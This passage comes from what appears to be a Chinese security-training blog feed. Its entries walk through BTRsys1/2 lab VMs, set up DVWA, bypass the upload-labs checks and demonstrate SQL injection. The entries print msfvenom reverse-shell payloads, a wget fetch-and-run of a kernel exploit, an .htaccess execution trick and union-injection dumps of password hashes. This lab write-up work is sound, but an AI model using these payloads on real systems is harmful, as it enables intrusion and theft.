<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.107</span><br><span class="line">nmap -T4 -A -v 192.168.1.107</span><br><span class="line">dirb http://192.168.1.121 </span><br><span class="line">nikto -host 192.168.1.107 </span><br></pre></td></tr></table></figure>

<p><img src="/1067/1.PNG"></p>
<ol start="2">
<li>弱口令只能登上去一个类似后台的界面，直接访问该地址能得到mysql错误的提示，这里忘截图了。审计登录界面源码，发现要求用户名得以<code>@btrisk.com</code>结尾，密码不等于<code>&#39;</code>才会发表单给数据库，否则直接提示错误：</li>
</ol>
<p><img src="/1067/2.PNG"></p>
<ol start="3">
<li>上mysql万能密码<code>&#39; OR &#39;1&#39; = &#39;1</code>，绕过检测，成功登录后台：</li>
</ol>
<p><img src="/1067/3.PNG"></p>
<ol start="4">
<li>后台是一个文件上传目录，审计源码，发现只能传<code>jpg/gif/png</code>格式的图片文件：</li>
</ol>
<p><img src="/1067/4.PNG"></p>
<ol start="5">
<li>msfvenom生成一个php反弹shell，后缀名定义为jpg，使用burpsuite抓包修改后缀名为php：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.106 lport=4444 -f raw &gt; shell.jpg</span><br></pre></td></tr></table></figure>

<p><img src="/1067/5.PNG"></p>
<ol start="6">
<li>metasploit开启监听，在前面dirb挖掘到的<code>/uploads</code>目录下执行反弹shell，获得低权shell：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">&gt;use exploit/multi/handler</span><br><span class="line">&gt;<span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">&gt;<span class="built_in">set</span> lhost 192.168.1.106</span><br><span class="line">&gt;<span class="built_in">set</span> lport 4444</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>

<p><img src="/1067/6.PNG"></p>
<ol start="7">
<li>查看根目录下文件，找到一个配置文件，里面有mysql数据库用户与口令：</li>
</ol>
<p><img src="/1067/7.PNG"></p>
<ol start="8">
<li>使用前面的地址、用户名、口令、表名连接mysql数据库：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -h localhost -u root -D deneme -p</span><br><span class="line">Enter password: toor</span><br></pre></td></tr></table></figure>

<p><img src="/1067/8.PNG"></p>
<ol start="9">
<li>查看表<code>user</code>里的信息，得到一个密码：</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/1067/9.PNG"></p>
<ol start="10">
<li>合理猜测（又是猜）这个密码是root密码（滑稽），成功获得root权限：</li>
</ol>
<p><img src="/1067/10.PNG"></p>
<ol start="11">
<li>不猜的话也能做，查看系统版本，搜索可利用提权漏洞：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsb_release -a</span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"></span><br><span class="line">searchsploit Linux 3.13.0</span><br></pre></td></tr></table></figure>

<p><img src="/1067/11.PNG"></p>
<ol start="12">
<li>把这个提权漏洞复制到本地apache根目录下，开启apache2服务：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/linux/local/37292.c /var/www/html/shell.c</span><br><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>

<p><img src="/1067/12.PNG"></p>
<ol start="13">
<li>靶机wget下载文件到<code>/tmp</code>下，gcc编译执行，获得root权限：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -O /tmp/shell.c http://192.168.1.106/shell.c</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">gcc shell.c -o shell</span><br><span class="line">./shell</span><br></pre></td></tr></table></figure>

<p><img src="/1067/13.PNG"></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://www.bilibili.com/video/BV1SJ411h7VW">2020发布 CTF基础入门&#x2F;CTF教程零基础 渗透测试&#x2F;web安全&#x2F;CTF夺旗【整套教程】</a></li>
<li><a href="https://jinlanzhijiao.github.io/2018/11/08/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BBTRsys-v1%E9%9D%B6%E6%9C%BA/">渗透测试之BTRsys v1靶机 | jlzj’s blog
</a></li>
</ol>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>metasploit</tag>
        <tag>burpsuite</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全0x11】综合测试（高难度）--- BTRsys2</title>
    <url>/1068/</url>
    <content><![CDATA[<p>51CTO的网课，本篇利用nmap搜索开放端口，nikto、dirb挖掘web服务找到后台地址，弱口令直接登录后台，修改主题404页面上传反弹shell，执行反弹shell获得低权用户shell，提权有两种方式，一种是查看网站配置文件找到mysql数据库，里面存着密码，可以root，另外一种是searchsploit系统版本，执行本地提权脚本返回root权限，本文两种方式均有展示。</p>
<p>本篇使用工具nmap，dirb，nikto，metasploit。</p>
<span id="more"></span>

<h1 id="使用命令"><a href="#使用命令" class="headerlink" title="使用命令"></a>使用命令</h1><h2 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成shell</span></span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=攻击机IP lport=攻击机端口 -f raw &gt; shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment">#开启监听</span></span><br><span class="line">msfconsole</span><br><span class="line">&gt;use exploit/multi/handler</span><br><span class="line">&gt;<span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">&gt;<span class="built_in">set</span> lhost 攻击机IP</span><br><span class="line">&gt;<span class="built_in">set</span> lport 攻击机端口</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>

<h1 id="渗透记录"><a href="#渗透记录" class="headerlink" title="渗透记录"></a>渗透记录</h1><ol>
<li>nmap扫描靶机IP地址开放端口，一个<code>80</code>口的web服务，<code>dirb</code>挖掘<code>80</code>端口web信息，找到后台登录界面：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.104</span><br><span class="line">nmap -T4 -A -v 192.168.1.104</span><br><span class="line">dirb http://192.168.1.104 </span><br><span class="line">nikto -host 192.168.1.104 </span><br></pre></td></tr></table></figure>

<p><img src="/1068/1.PNG"></p>
<ol start="2">
<li>弱口令直接登上去了，修改主题404页面为反弹shell：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.106 lport=4444 -f raw &gt; shell.php &amp;&amp; <span class="built_in">cat</span> shell.php</span><br></pre></td></tr></table></figure>

<p><img src="/1068/2.PNG"></p>
<ol start="3">
<li>metasploit开启监听，访问404页面，得到低权shell，sysinfo查看系统版本：</li>
</ol>
<p><img src="/1068/3.PNG"></p>
<ol start="4">
<li>本地搜索可利用提权漏洞：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line"></span><br><span class="line">searchsploit Linux 4.4.0</span><br></pre></td></tr></table></figure>

<p><img src="/1068/4.PNG"></p>
<ol start="5">
<li>复制并编译提权脚本到apache根目录下，开启apache2服务：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/linux/local/44298.c /var/www/html/shell.c</span><br><span class="line">gcc /var/www/html/shell.c -o /var/www/html/shell</span><br><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>

<p><img src="/1068/5.PNG"></p>
<ol start="6">
<li>靶机上wget下来，添加执行权限，执行获得root权限：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget -O shell http://192.168.1.106/shell</span><br><span class="line"><span class="built_in">chmod</span> 777 shell</span><br><span class="line">./shell</span><br></pre></td></tr></table></figure>

<p><img src="/1068/6.PNG"></p>
<ol start="7">
<li>提权shell的上传除了靶机wget也可以在meterpreter里upload：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; upload /var/www/html/shell</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> 777 shell</span><br><span class="line">./shell</span><br></pre></td></tr></table></figure>

<p><img src="/1068/7.PNG"></p>
<ol start="8">
<li>除了系统版本漏洞提权，还可以猜数据库（滑稽），查看<code>/var/www/html/wordpress/wp-config.php</code>得到mysql数据库口令和密码：</li>
</ol>
<p><img src="/1068/8.PNG"></p>
<ol start="9">
<li>查看表：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -h localhost -u root -p -D wordpress -e <span class="string">&#x27;show tables;&#x27;</span>:</span><br><span class="line">Enter password: rootpassword!</span><br></pre></td></tr></table></figure>

<p><img src="/1068/9.PNG"></p>
<ol start="10">
<li>查看<code>wp_users</code>表中数据，找到md5加密的密码：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -h localhost -u root -p -D wordpress -e <span class="string">&#x27;select * from wp_users&#x27;</span>:</span><br><span class="line">Enter password: rootpassword!</span><br></pre></td></tr></table></figure>

<p><img src="/1068/10.PNG"></p>
<ol start="11">
<li>百度解密得到明文<code>roottoor</code>，因为靶机没有python模拟不出来<code>sh/bash</code>，因此<code>su</code>命令不能用，直接攻击机本地ssh连接登录得到root权限：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh root@192.168.1.104</span><br><span class="line">root@192.168.1.104<span class="string">&#x27;s password: roottoor</span></span><br></pre></td></tr></table></figure>

<p><img src="/1068/11.PNG"></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://www.bilibili.com/video/BV1SJ411h7VW">2020发布 CTF基础入门&#x2F;CTF教程零基础 渗透测试&#x2F;web安全&#x2F;CTF夺旗【整套教程】</a></li>
</ol>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全1x01】安恒厂家网络安全培训 --- day1</title>
    <url>/1069/</url>
    <content><![CDATA[<p>第一天上午开幕式没什么干货。</p>
<p>下午主要是软件的安装和环境搭建与配置，安装了jdk、phpstudy、burpsuite、DVWA。</p>
<span id="more"></span>

<h1 id="jdk"><a href="#jdk" class="headerlink" title="jdk"></a>jdk</h1><p>官网下载，<strong>选择ver8，太高级的burpsuite不支持。</strong></p>
<p>一直下一步即可，安装完后添加环境变量：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">变量名：JAVA_HOME</span><br><span class="line">变量值：电脑上JDK安装的绝对路径</span><br><span class="line"></span><br><span class="line">变量名：CLASSPATH</span><br><span class="line">变量值：.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</span><br><span class="line"></span><br><span class="line">修改Path变量:</span><br><span class="line">%JAVA_HOME%\bin</span><br><span class="line">%JAVA_HOME%\jre\bin</span><br></pre></td></tr></table></figure>

<h1 id="phpstudy"><a href="#phpstudy" class="headerlink" title="phpstudy"></a>phpstudy</h1><p>官网下载2018版，安装注意别在<strong>包含中文或空格路径</strong>下。</p>
<p>安装完查看网站根目录，这个<code>\WWW</code>目录下放练习靶机网站文件就可以本地访问了：</p>
<p><img src="/1069/5.PNG"></p>
<h1 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装好jdk后，解压得到两个文件，一个注册机一个本体。运行注册机，按顺序复制粘贴license即可：</p>
<p><img src="/1069/4.PNG"></p>
<h2 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h2><p>Firefox附加组件-&gt;商店搜索<code>foxy proxy</code>，安装完后添加新代理<code>127.0.0.1:8080</code>：</p>
<p><img src="/1069/7.PNG"></p>
<p>切换代理，burpsuite下打开截断，即可截获数据包。</p>
<p><strong>有可能会因为证书问题导致截获不到数据包，firefox下访问<a href="http://burp/">http://burp</a> ，下载右上角的证书，然后导入浏览器即可。</strong></p>
<h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><p>解压得到网站目录，拖到phpstudy根目录下，编辑<code>WWW\dvwa\config\config.inc.php</code>添加密码<code>root</code>，修改mysql端口为<code>3306</code>（phpstudy默认mysql端口）。</p>
<p><img src="/1069/6.PNG"></p>
<p>此时访问<code>127.0.0.1/dvwa</code>即可，但是<code>localhost/dvwa</code>却不行，这是由于DNS将localhost解析成了<code>::1</code>这个ipv6地址。</p>
<p>cmd下ping localhost：</p>
<p><img src="/1069/1.PNG"></p>
<p>cmd打开RegEdit，导航到HKEY_LOCAL_MACHINE \ SYSTEM \ CurrentControlSet \ Services \ tcpip6 \ Parameters， 创建DisabledComponents DWORD注册表值，将其值设置为20（十六进制）：</p>
<p><img src="/1069/2.PNG"></p>
<p>然后重启电脑，再ping localhost就解析到ipv4了：</p>
<p><img src="/1069/3.PNG"></p>
<p>此时<code>localhost/dvwa</code>也可以访问了。</p>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>burpsuite</tag>
        <tag>jdk</tag>
        <tag>phpstudy</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全2x01】上传漏洞靶场upload-labs（Pass01-04）</title>
    <url>/1070/</url>
    <content><![CDATA[<p>官方README.md：</p>
<p>upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</p>
<p>本文记录Pass01-04。都是简单的修改后缀、文件类型绕过检测。</p>
<span id="more"></span>

<h1 id="Pass01"><a href="#Pass01" class="headerlink" title="Pass01"></a>Pass01</h1><p>复制修改前端文件判断js，添加<code>.php</code>，控制台再发一次即可：</p>
<p><img src="/1070/1.PNG"></p>
<h1 id="Pass02"><a href="#Pass02" class="headerlink" title="Pass02"></a>Pass02</h1><p>查看源码只判断文件类型，burpsuite改包<code>Content-Type</code>为<code>image/jpeg</code>即可：</p>
<p><img src="/1070/2.PNG"></p>
<h1 id="Pass03"><a href="#Pass03" class="headerlink" title="Pass03"></a>Pass03</h1><p>查看源码过滤了多种php格式，除了<code>php3</code>、<code>phtml</code>，修改文件后缀即可：</p>
<p><img src="/1070/3.PNG"></p>
<h1 id="Pass04"><a href="#Pass04" class="headerlink" title="Pass04"></a>Pass04</h1><p>查看源码几乎把所有php格式全过滤了，这里可以先传一个<code>.htaccess</code>改变文件扩展名。</p>
<p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置.通过htaccess文件，可以实现:网页301重定向、自定义404页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
<p>创建一个<code>.htaccess</code>将目录下匹配的jpg文件解析为php执行：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">jpg</span>&quot;&gt;</span></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>之后上传<code>.jpg</code>格式文件即可按照<code>.php</code>文件访问。</p>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>burpsuite</tag>
        <tag>upload-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全1x02】安恒厂家网络安全培训 --- day2</title>
    <url>/1072/</url>
    <content><![CDATA[<p>上午讲burpsuite的暴力破解模块，四种攻击模式。完事安装kali。</p>
<p>下午SQL注入，手工和sqlmap都有介绍，最后剩一点时间简单讲了点文件包含漏洞。</p>
<span id="more"></span>

<h1 id="burpsuite–Intruder"><a href="#burpsuite–Intruder" class="headerlink" title="burpsuite–Intruder"></a>burpsuite–Intruder</h1><p>抓包后右键Send to Intruder即可进行暴力破解，以下面这一段参数为例,被§§包围的部分(1)、(2)为需要破解的部分：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">user=§user§&amp;password=§password§&amp;imageField.x=17&amp;imageField.y=1</span><br><span class="line">     (1)            (2)</span><br><span class="line">---------------------------------------------------------- </span><br><span class="line"> payload1 = [user1,user2,user3]</span><br><span class="line"> payload2 = [pass1,pass2,pass3]</span><br><span class="line">---------------------------------------------------------- </span><br></pre></td></tr></table></figure>

<p>四种模式如下：</p>
<h2 id="Sniper-狙击"><a href="#Sniper-狙击" class="headerlink" title="Sniper (狙击)"></a>Sniper (狙击)</h2><p>按顺序将(1)(2)其中之一中使用所给的payload进行替换，另一个参数不变。</p>
<p>payload只能设置一个，若使用payload2的话，破解尝试顺序为：</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>user(1)</th>
<th>password(2)</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>pass1</td>
<td>password</td>
</tr>
<tr>
<td>2</td>
<td>pass2</td>
<td>password</td>
</tr>
<tr>
<td>3</td>
<td>pass3</td>
<td>password</td>
</tr>
<tr>
<td>4</td>
<td>user</td>
<td>pass1</td>
</tr>
<tr>
<td>5</td>
<td>user</td>
<td>pass2</td>
</tr>
<tr>
<td>6</td>
<td>user</td>
<td>pass3</td>
</tr>
</tbody></table>
<h2 id="Battering-ram-撞击"><a href="#Battering-ram-撞击" class="headerlink" title="Battering ram (撞击)"></a>Battering ram (撞击)</h2><p>使用payload同时替换所有被选中的位置。</p>
<p>同样payload只能设置一个，使用payload2的话，破解尝试顺序为：</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>user(1)</th>
<th>password(2)</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>pass1</td>
<td>pass1</td>
</tr>
<tr>
<td>2</td>
<td>pass2</td>
<td>pass2</td>
</tr>
<tr>
<td>3</td>
<td>pass3</td>
<td>pass3</td>
</tr>
</tbody></table>
<h2 id="Pitchfork-交叉"><a href="#Pitchfork-交叉" class="headerlink" title="Pitchfork (交叉)"></a>Pitchfork (交叉)</h2><p>按顺序分别使用payload1替换(1)，payload2替换(2)，一一对应，payload数量较少的列表用完则停止。</p>
<p>payload可设置(1~替换位)个，使用payload1、payload2的话，破解尝试顺序为：</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>user(1)</th>
<th>password(2)</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>user1</td>
<td>pass1</td>
</tr>
<tr>
<td>2</td>
<td>user2</td>
<td>pass2</td>
</tr>
<tr>
<td>3</td>
<td>user3</td>
<td>pass3</td>
</tr>
</tbody></table>
<p>破解方式python模拟代码如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>( <span class="built_in">min</span>(<span class="built_in">len</span>(payload1),<span class="built_in">len</span>(payload2)) ):</span><br><span class="line">    user = payload1[i]</span><br><span class="line">    password = payload2[i]</span><br></pre></td></tr></table></figure>

<h2 id="Cluster-Bomb-集束炸弹"><a href="#Cluster-Bomb-集束炸弹" class="headerlink" title="Cluster Bomb (集束炸弹)"></a>Cluster Bomb (集束炸弹)</h2><p>通常意义上的穷举法。</p>
<p>payload可设置(1~替换位)个，使用payload1、payload2的话，破解尝试顺序为：</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>user(1)</th>
<th>password(2)</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>user1</td>
<td>pass1</td>
</tr>
<tr>
<td>2</td>
<td>user2</td>
<td>pass1</td>
</tr>
<tr>
<td>3</td>
<td>user3</td>
<td>pass1</td>
</tr>
<tr>
<td>4</td>
<td>user1</td>
<td>pass2</td>
</tr>
<tr>
<td>5</td>
<td>user2</td>
<td>pass2</td>
</tr>
<tr>
<td>6</td>
<td>user3</td>
<td>pass2</td>
</tr>
<tr>
<td>7</td>
<td>user1</td>
<td>pass3</td>
</tr>
<tr>
<td>8</td>
<td>user2</td>
<td>pass3</td>
</tr>
<tr>
<td>9</td>
<td>user3</td>
<td>pass3</td>
</tr>
</tbody></table>
<p>破解方式python模拟代码如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payload2:</span><br><span class="line">        user = payload1</span><br><span class="line">        password = payload2</span><br></pre></td></tr></table></figure>

<h1 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h1><p>之前装过了，虚拟机安装同理：</p>
<p><a href="http://got17.cn/1010/">http://got17.cn/1010/</a></p>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="SQL注入漏洞—low"><a href="#SQL注入漏洞—low" class="headerlink" title="SQL注入漏洞—low"></a>SQL注入漏洞—low</h2><ol>
<li>判断注入类型</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27; = &#x27;</span><span class="number">1</span> </span><br></pre></td></tr></table></figure>

<ol start="2">
<li>猜列数</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or &#x27;</span>a<span class="string">&#x27; = &#x27;</span>a<span class="string">&#x27; order by 1 #</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;a&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span> #</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or &#x27;</span>a<span class="string">&#x27; = &#x27;</span>a<span class="string">&#x27; order by ... #</span></span><br><span class="line"><span class="string">#二分查询(0~n)</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>获取字段顺序</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2 #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#回显</span></span><br><span class="line"><span class="string">ID: 1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> #</span><br><span class="line"><span class="keyword">First</span> name: admin</span><br><span class="line">Surname: admin</span><br><span class="line"></span><br><span class="line">ID: <span class="number">1</span><span class="string">&#x27; union select 1,2 #</span></span><br><span class="line"><span class="string">First name: 1</span></span><br><span class="line"><span class="string">Surname: 2</span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li>获取数据库名称</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,database() #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#回显</span></span><br><span class="line"><span class="string">ID: 1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database() #</span><br><span class="line"><span class="keyword">First</span> name: admin</span><br><span class="line">Surname: admin</span><br><span class="line"></span><br><span class="line">ID: <span class="number">1</span><span class="string">&#x27; union select 1,database() #</span></span><br><span class="line"><span class="string">First name: 1</span></span><br><span class="line"><span class="string">Surname: dvwa</span></span><br></pre></td></tr></table></figure>

<ol start="5">
<li>获取数据库中的表</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#回显</span></span><br><span class="line"><span class="string">ID: 1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() #</span><br><span class="line"><span class="keyword">First</span> name: admin</span><br><span class="line">Surname: admin</span><br><span class="line"></span><br><span class="line">ID: <span class="number">1</span><span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</span></span><br><span class="line"><span class="string">First name: 1</span></span><br><span class="line"><span class="string">Surname: guestbook,users</span></span><br></pre></td></tr></table></figure>

<ol start="6">
<li>查询表中字段名</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#回显</span></span><br><span class="line"><span class="string">ID: 1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> #</span><br><span class="line"><span class="keyword">First</span> name: admin</span><br><span class="line">Surname: admin</span><br><span class="line"></span><br><span class="line">ID: <span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; #</span></span><br><span class="line"><span class="string">First name: 1</span></span><br><span class="line"><span class="string">Surname: user_id,first_name,last_name,user,password,avatar</span></span><br></pre></td></tr></table></figure>

<ol start="7">
<li>打印数据</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1 = 1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#回显</span></span><br><span class="line"><span class="string">ID: 1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(user_id,first_name,last_name),group_concat(password) <span class="keyword">from</span> users #</span><br><span class="line"><span class="keyword">First</span> name: admin</span><br><span class="line">Surname: admin</span><br><span class="line"></span><br><span class="line">ID: <span class="number">1</span><span class="string">&#x27; or 1 = 1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</span></span><br><span class="line"><span class="string">First name: Gordon</span></span><br><span class="line"><span class="string">Surname: Brown</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ID: 1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(user_id,first_name,last_name),group_concat(password) <span class="keyword">from</span> users #</span><br><span class="line"><span class="keyword">First</span> name: Hack</span><br><span class="line">Surname: Me</span><br><span class="line"></span><br><span class="line">ID: <span class="number">1</span><span class="string">&#x27; or 1 = 1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</span></span><br><span class="line"><span class="string">First name: Pablo</span></span><br><span class="line"><span class="string">Surname: Picasso</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ID: 1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(user_id,first_name,last_name),group_concat(password) <span class="keyword">from</span> users #</span><br><span class="line"><span class="keyword">First</span> name: Bob</span><br><span class="line">Surname: Smith</span><br><span class="line"></span><br><span class="line">ID: <span class="number">1</span><span class="string">&#x27; or 1 = 1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</span></span><br><span class="line"><span class="string">First name: 1adminadmin,2GordonBrown,3HackMe,4PabloPicasso,5BobSmith</span></span><br><span class="line"><span class="string">Surname: 5f4dcc3b5aa765d61d8327deb882cf99,e99a18c428cb38d5f260853678922e03,8d3533d75ae2c3966d7e0d4fcc69216b,0d107d09f5bbe40cade3de5c71e9e9b7,5f4dcc3b5aa765d61d8327deb882cf99</span></span><br></pre></td></tr></table></figure>

<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sql -u [url] 需要cookie，这里可以使用burpsuite抓一个包保存到本地sqlmap</span></span><br><span class="line"></span><br><span class="line">sqlmap -r get.txt --dbs</span><br><span class="line"></span><br><span class="line">sqlmap -r get.txt -D dvwa --tables</span><br><span class="line"></span><br><span class="line">sqlmap -r get.txt -D dvwa -T <span class="built_in">users</span> --columns</span><br><span class="line"></span><br><span class="line">sqlmap -r get.txt -D dvwa -T <span class="built_in">users</span> -C <span class="string">&quot;user,password&quot;</span> --dump</span><br></pre></td></tr></table></figure>

<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://localhost/dvwa/vulnerabilities/fi/?page=file1.php</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改?page=后文件目录</span></span><br><span class="line">http://localhost/dvwa/vulnerabilities/fi/?page=../../robots.txt</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>burpsuite</tag>
